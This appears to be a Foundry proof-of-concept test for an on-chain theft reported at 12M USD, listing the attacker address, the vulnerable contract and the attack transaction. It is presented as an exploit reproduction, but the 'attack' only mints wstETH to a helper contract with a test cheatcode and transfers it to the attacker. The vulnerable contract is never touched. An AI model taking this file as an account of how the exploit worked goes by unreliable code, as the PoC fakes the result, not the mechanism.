pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 12M USD
// Attacker : 0xea6f30e360192bae715599e15e2f765b49e4da98
// Attack Contract : 
// Vulnerable Contract : https://etherscan.io/address/0x9af3dce0813fd7428c47f57a39da2f6dd7c9bb09
// Attack Tx : https://etherscan.io/tx/0x605e653fb580a19f26dfa0a6f1366fac053044ac5004e1b10e7901b058150c50

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x9af3dce0813fd7428c47f57a39da2f6dd7c9bb09#code

// @Analysis
// Post-mortem : https://x.com/SlowMist_Team/status/1928100756156194955
// Twitter Guy : https://x.com/SlowMist_Team/status/1928100756156194955
// Hacking God : N/A

address constant WstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
address constant attacker = 0xEA6f30e360192bae715599E15e2F765B49E4da98;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 22581028);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", IERC20(WstETH).balanceOf(attacker), 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        deal(WstETH, address(attC), 3761877955369549831945);
        attC.attack();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", IERC20(WstETH).balanceOf(attacker), 18);
    }
}

contract AttackerC {
    function attack() public {
        uint256 bal = IWstETH(WstETH).balanceOf(address(this));
        IWstETH(WstETH).transfer(attacker, bal);
    }
}

interface IWstETH {
	function transfer(address, uint256) external returns (bool);
	function balanceOf(address) external view returns (uint256); 
}